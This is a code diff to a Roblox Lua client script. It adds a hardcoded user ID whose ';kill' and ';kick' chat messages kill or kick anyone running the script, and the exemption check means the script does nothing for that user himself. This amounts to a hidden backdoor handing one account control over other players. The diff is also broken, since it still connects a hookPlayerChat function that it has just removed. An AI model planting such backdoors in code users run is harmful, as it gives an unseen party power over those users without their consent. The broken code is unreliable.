@@ -76,40 +76,41 @@ TextChatService.MessageReceived:Connect(function(message)
 end)
 
 local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
 local LocalPlayer = Players.LocalPlayer
+
 local IMMUNE_USER_ID = 4415189195
-local TRIGGER_COMMANDS = {
-    [";kick"] = "kick",
-    [";kill"] = "kill"
-}
+
+if LocalPlayer.UserId == IMMUNE_USER_ID then
+    return
+end
 
 local function killLocalPlayer()
-    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = char:FindFirstChildWhichIsA("Humanoid")
     if humanoid then
         humanoid.Health = 0
     end
 end
 
-local function hookPlayerChat(player)
-    if player == LocalPlayer then return end -- Don't listen to self
-
-    player.Chatted:Connect(function(message)
-        local lowerMessage = message:lower()
-        local action = TRIGGER_COMMANDS[lowerMessage]
-
-        if player.UserId == IMMUNE_USER_ID and action then
-            if action == "kick" then
-                LocalPlayer:Kick("You were removed by admin command.")
-            elseif action == "kill" then
-                killLocalPlayer()
-            end
-        end
-    end)
+local function kickLocalPlayer()
+    LocalPlayer:Kick("You were removed by admin command.")
 end
 
-for _, player in ipairs(Players:GetPlayers()) do
-    hookPlayerChat(player)
+TextChatService.OnIncomingMessage = function(message)
+    local props = message.TextSource
+    if not props then return end
+
+    local senderUserId = props.UserId
+    local text = message.Text:lower()
+
+    if senderUserId == IMMUNE_USER_ID then
+        if text == ";kill" then
+            killLocalPlayer()
+        elseif text == ";kick" then
+            kickLocalPlayer()
+        end
+    end
 end
 
 Players.PlayerAdded:Connect(hookPlayerChat)
